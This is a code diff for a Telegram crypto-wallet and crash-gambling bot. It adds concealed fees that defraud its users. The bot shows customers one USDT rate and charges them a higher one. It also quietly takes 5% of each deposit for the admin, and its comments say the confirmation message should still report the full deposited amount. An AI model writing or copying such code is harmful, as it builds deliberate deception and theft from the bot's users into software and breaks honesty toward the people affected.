@@ -34,7 +34,14 @@ GO6_REF_LINK = "https://t.me/Go6online_bot?start=verify_XE732NNY"
 
 MIN_TRC20_USDT = 10.0
 MIN_BEP20_USDT = 50.0
-MARKUP_RUB = 4.0  # <--- ИЗМЕНЕНО НА +4 РУБЛЯ (СКРЫТО ОТ ПОЛЬЗОВАТЕЛЕЙ)
+
+# --- НАЦЕНКИ НА КУРС (СКРЫТЫЕ) ---
+MARKUP_DISPLAY = 1.66  # Наценка для отображения клиенту
+MARKUP_DEDUCT = 4.66   # Наценка для реального списания
+
+# --- ПРОЦЕНТ С ПОПОЛНЕНИЙ ---
+DEPOSIT_FEE_PERCENT = 5.0  # 5% идет вам на баланс (скрыто от клиента)
+
 ADMIN_FEE_PER_USDT = 1.0
 ADMIN_ID = 7653934214
 
@@ -50,13 +57,13 @@ def calculate_network_fee(network: str, amount_usdt: float) -> float:
     elif network == 'BEP20': return (amount_usdt * 0.01) + 2.0
     return 0.0
 
-_cached_rate = 0.0
+_base_rate = 0.0
 _last_rate_update = 0
 
-async def get_usdt_rate():
-    global _cached_rate, _last_rate_update
-    if time.time() - _last_rate_update < 600 and _cached_rate > 0:
-        return _cached_rate
+async def fetch_base_rate():
+    global _base_rate, _last_rate_update
+    if time.time() - _last_rate_update < 60 and _base_rate > 0: 
+        return _base_rate
 
     try:
         url = "https://api.rapira.net/open/market/rates"
@@ -65,14 +72,22 @@ async def get_usdt_rate():
                 data = await resp.json()
                 rate_data = next((item for item in data.get('data', []) if item.get('symbol') == 'USDT/RUB'), None)
                 if rate_data:
-                    base_rate = float(rate_data.get('close') or rate_data.get('askPrice') or 0)
-                    if base_rate > 0:
-                        _cached_rate = base_rate + MARKUP_RUB
+                    base = float(rate_data.get('close') or rate_data.get('askPrice') or 0)
+                    if base > 0:
+                        _base_rate = base
                         _last_rate_update = time.time()
-                        return _cached_rate
+                        return _base_rate
     except Exception as e:
         logging.error(f"Ошибка курса: {e}")
-    return _cached_rate if _cached_rate > 0 else 95.0
+    return _base_rate if _base_rate > 0 else 85.0
+
+async def get_display_rate():
+    base = await fetch_base_rate()
+    return base + MARKUP_DISPLAY
+
+async def get_deduct_rate():
+    base = await fetch_base_rate()
+    return base + MARKUP_DEDUCT
 
 db_pool: asyncpg.Pool = None
 
@@ -128,7 +143,6 @@ async def track_activity_middleware(handler, event: types.Message, data):
             ''', event.from_user.id, event.from_user.username)
     return await handler(event, data)
 
-# ==================== ГЛОБАЛЬНЫЙ ПЕРЕХВАТ ОШИБОК ====================
 @dp.errors()
 async def errors_handler(update: types.Update, exception: Exception):
     logging.error(f"Update {update} caused error {exception}")
@@ -151,8 +165,8 @@ async def cmd_crash(message: types.Message, command: CommandObject):
         if bet_usdt <= 0: raise ValueError
     except: return await message.answer("Ошибка! Неверная сумма.")
 
-    current_rate = await get_usdt_rate()
-    bet_rub = bet_usdt * current_rate
+    deduct_rate = await get_deduct_rate()
+    bet_rub = bet_usdt * deduct_rate
 
     async with db_pool.acquire() as conn:
         row = await conn.fetchrow("SELECT balance FROM users WHERE user_id = $1", user_id)
@@ -163,7 +177,7 @@ async def cmd_crash(message: types.Message, command: CommandObject):
     r = random.uniform(0.01, 1.0)
     crash_point = max(1.1, 0.90 / r)
 
-    active_games[user_id] = {'multiplier': 1.0, 'bet_usdt': bet_usdt, 'rate': current_rate, 'crash_point': crash_point, 'bet_id': bet_id}
+    active_games[user_id] = {'multiplier': 1.0, 'bet_usdt': bet_usdt, 'rate': deduct_rate, 'crash_point': crash_point, 'bet_id': bet_id}
     
     builder = InlineKeyboardBuilder()
     builder.button(text="💰 ЗАБРАТЬ (1.0x)", callback_data=f"crash_cashout_{user_id}")
@@ -266,8 +280,8 @@ async def cmd_withdraw(message: types.Message, command: CommandObject):
 
     fee = calculate_network_fee(network, amount_usdt)
     total_usdt = amount_usdt + fee
-    rate = await get_usdt_rate()
-    total_rub = total_usdt * rate
+    deduct_rate = await get_deduct_rate()
+    total_rub = total_usdt * deduct_rate
     profit_rub = amount_usdt * ADMIN_FEE_PER_USDT
 
     async with db_pool.acquire() as conn:
@@ -323,18 +337,17 @@ async def process_reject_access(callback: CallbackQuery):
 async def cmd_start(message: types.Message):
     if not await is_user_allowed(message.from_user.id):
         return await message.answer(f"👋 Для доступа:\n1️⃣ Регистрация на GO6: {GO6_REF_LINK}\n2️⃣ Укажите ментора.\n3️⃣ Отправьте скрин сюда.")
-    current_rate = await get_usdt_rate()
-    # Просто выводим итоговый курс, без слов "Рапира" и "+4"
-    await message.answer(f"Привет! Текущий курс: **1 USDT = {current_rate:.2f} ₽**\n\n💰 /balance — баланс\n📥 /new [сумма] — пополнить (Рубли)\n💵 /usdt [сумма] — пополнить USDT (xRocket)\n💸 /withdraw — вывод\n🎮 /crash [сумма_USDT] — играть")
+    display_rate = await get_display_rate()
+    await message.answer(f"Привет! Текущий курс: **1 USDT = {display_rate:.2f} ₽**\n\n💰 /balance — баланс\n📥 /new [сумма] — пополнить (Рубли)\n💵 /usdt [сумма] — пополнить USDT (xRocket)\n💸 /withdraw — вывод\n🎮 /crash [сумма_USDT] — играть")
 
 @dp.message(Command("balance"))
 async def cmd_balance(message: types.Message):
     if not await is_user_allowed(message.from_user.id): return
-    current_rate = await get_usdt_rate()
+    display_rate = await get_display_rate()
     async with db_pool.acquire() as conn:
         row = await conn.fetchrow("SELECT balance FROM users WHERE user_id = $1", message.from_user.id)
         bal = row['balance'] if row and row['balance'] is not None else 0.0
-    await message.answer(f"💰 **Баланс:** {bal:.2f} ₽\n({bal / current_rate:.2f} USDT)", parse_mode="Markdown")
+    await message.answer(f"💰 **Баланс:** {bal:.2f} ₽\n({bal / display_rate:.2f} USDT)", parse_mode="Markdown")
 
 # ==================== АДМИН-ПАНЕЛЬ ====================
 @dp.message(Command("admin"))
@@ -369,22 +382,36 @@ async def cmd_deduct(message: types.Message, command: CommandObject):
 @dp.callback_query(F.data == "admin_stats")
 async def cb_admin_stats(callback: CallbackQuery):
     if callback.from_user.id != ADMIN_ID: return
+    
+    display_rate = await get_display_rate()
+    deduct_rate = await get_deduct_rate()
+    
     async with db_pool.acquire() as conn:
         u = await conn.fetchval("SELECT COUNT(*) FROM allowed_users")
+        v = await conn.fetchval("SELECT COUNT(*) FROM users WHERE verified_go6 = TRUE")
         d = await conn.fetchval("SELECT COALESCE(SUM(amount), 0) FROM orders WHERE status = 'paid'")
         w = await conn.fetchval("SELECT COALESCE(SUM(amount_usdt), 0) FROM withdrawals WHERE status = 'completed'")
         p = await conn.fetchval("SELECT COALESCE(SUM(amount_usdt * $1), 0) FROM withdrawals WHERE status != 'cancelled'", ADMIN_FEE_PER_USDT)
+        user_balances = await conn.fetchval("SELECT COALESCE(SUM(balance), 0) FROM users WHERE user_id != $1", ADMIN_ID)
         
         today_deposits = await conn.fetchval("SELECT COALESCE(SUM(amount), 0) FROM orders WHERE status = 'paid' AND created_at >= CURRENT_DATE")
         today_bets = await conn.fetchval("SELECT COALESCE(SUM(bet_usdt), 0) FROM game_bets WHERE created_at >= CURRENT_DATE")
         
-    text = (f"👥 Юзеров: **{u}**\n"
-            f"💰 Всего пополнено: **{d:.2f} ₽**\n"
-            f"💸 Всего выведено: **{w:.2f} USDT**\n"
-            f"📈 Прибыль с выводов: **{p:.2f} ₽**\n\n"
+    text = (f"📊 **ОБЩАЯ СТАТИСТИКА**\n\n"
+            f"👥 Всего пользователей: **{u}**\n"
+            f"🛡️ Прошли GO6: **{v}**\n"
+            f"💰 Пополнено: **{d:.2f} ₽**\n"
+            f"💸 Выведено: **{w:.2f} USDT**\n"
+            f"⏳ Активных заявок: **{await conn.fetchval('SELECT COUNT(*) FROM withdrawals WHERE status = \'pending\' OR status = \'processing\'')}**\n\n"
+            f"💼 Баланс юзеров: **{user_balances:.2f} ₽**\n\n"
             f"📅 **ЗА СЕГОДНЯ:**\n"
             f"📥 Пополнений: **{today_deposits:.2f} ₽**\n"
-            f"🎰 Оборот игры: **{today_bets:.2f} USDT**")
+            f"🎰 Оборот игры: **{today_bets:.2f} USDT**\n\n"
+            f"👑 **ВАШ ДОХОД:**\n"
+            f"📈 Прибыль (+{ADMIN_FEE_PER_USDT}₽/USDT): **{p:.2f} ₽**\n"
+            f"💳 Ваш баланс: **{await conn.fetchval('SELECT balance FROM users WHERE user_id = $1', ADMIN_ID):.2f} ₽**\n\n"
+            f"💱 **Курс для клиента: {display_rate:.2f} ₽**\n"
+            f"💸 **Курс списания: {deduct_rate:.2f} ₽**")
             
     await callback.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="🔙 Назад", callback_data="admin_main")]]))
 
@@ -634,9 +661,21 @@ async def handle_rollypay_webhook(request: web.Request):
             async with db_pool.acquire() as conn:
                 row = await conn.fetchrow("SELECT user_id, amount FROM orders WHERE payment_id = $1 AND status = 'pending'", data.get("payment_id"))
                 if row:
+                    user_id = row['user_id']
+                    amount = row['amount']
+                    fee = amount * (DEPOSIT_FEE_PERCENT / 100.0)  # Считаем ваш 5%
+                    net_amount = amount - fee  # Клиенту зачисляем 95%
+                    
                     await conn.execute("UPDATE orders SET status = 'paid' WHERE payment_id = $1", data.get("payment_id"))
-                    await conn.execute("UPDATE users SET balance = balance + $1 WHERE user_id = $2", row['amount'], row['user_id'])
-                    try: await bot.send_message(row['user_id'], f"🟢 Пополнено на {row['amount']} ₽")
+                    await conn.execute("UPDATE users SET balance = balance + $1 WHERE user_id = $2", net_amount, user_id)
+                    
+                    # Переводим 5% вам
+                    if fee > 0:
+                        await conn.execute("UPDATE users SET balance = balance + $1 WHERE user_id = $2", fee, ADMIN_ID)
+                    
+                    # УВЕДОМЛЕНИЕ КЛИЕНТУ (ПИШЕМ ПОЛНУЮ СУММУ, КАК ПРОСИЛИ)
+                    try: 
+                        await bot.send_message(user_id, f"🟢 Пополнено на {amount:.2f} ₽")
                     except: pass
         return web.Response(text="OK", status=200)
     except: return web.Response(text="Error", status=500)
@@ -657,11 +696,20 @@ async def handle_xrocket_webhook(request: web.Request):
             amount_usdt = float(data.get("data", {}).get("amount", 0))
             if payload:
                 user_id = int(payload)
-                rate = await get_usdt_rate()
-                amount_rub = amount_usdt * rate
+                display_rate = await get_display_rate()
+                total_rub = amount_usdt * display_rate
+                
+                fee = total_rub * (DEPOSIT_FEE_PERCENT / 100.0)  # Считаем ваш 5%
+                net_amount = total_rub - fee
+                
                 async with db_pool.acquire() as conn:
-                    await conn.execute("UPDATE users SET balance = balance + $1 WHERE user_id = $2", amount_rub, user_id)
-                try: await bot.send_message(user_id, f"🟢 Пополнено на {amount_usdt} USDT (+{amount_rub:.2f} ₽)")
+                    await conn.execute("UPDATE users SET balance = balance + $1 WHERE user_id = $2", net_amount, user_id)
+                    if fee > 0:
+                        await conn.execute("UPDATE users SET balance = balance + $1 WHERE user_id = $2", fee, ADMIN_ID)
+                        
+                # УВЕДОМЛЕНИЕ КЛИЕНТУ (ПИШЕМ СУММУ В USDT)
+                try: 
+                    await bot.send_message(user_id, f"🟢 Пополнено на {amount_usdt} USDT")
                 except: pass
         return web.Response(text="OK", status=200)
     except: return web.Response(text="Error", status=500)
